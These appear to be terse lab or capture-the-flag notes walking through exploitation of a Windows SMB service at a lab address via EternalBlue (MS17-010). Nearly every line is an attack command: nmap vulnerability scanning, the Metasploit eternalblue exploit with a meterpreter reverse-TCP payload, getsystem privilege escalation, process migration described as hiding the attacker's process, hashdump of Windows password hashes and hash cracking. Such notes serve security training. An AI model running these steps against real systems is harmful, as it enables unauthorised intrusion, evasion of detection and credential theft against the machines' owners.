do the nmap scan and could find smb port
do vulnerability scan using nmap

[locate .nse | grep smb]
[locate .nse | grep smb-vuln]
[nmap --script vuln -p 445 10.10.10.10]
[msfconsole -q] - [search eternalblue]
[auxiliary/admin.....] - scanners to find out whether vuln or not

now the service is vulnerable to eternalblue. lets try to exploit it. go to msfconsole

[msfconsole -q]

in msfconsole 

[search eternalblue]

[use exploit/windows/smb/ms17_010_eternalblue]

[set payload windows/x64/meterpreter/reverse_tcp]

getting a meterpreter shell

[background]

[use shell_to_meterpreter]

[show options] - set session to 1

[run]

[background]

[getuid]

[sessions -i 2]

[getsystem]

[ps]

[migrate -p] - by process id [migrate -N] - by process name

migrate service can be used to hide our process

[hashdump] - dumping windows hash files

[crackstation] - can be used to crack the hash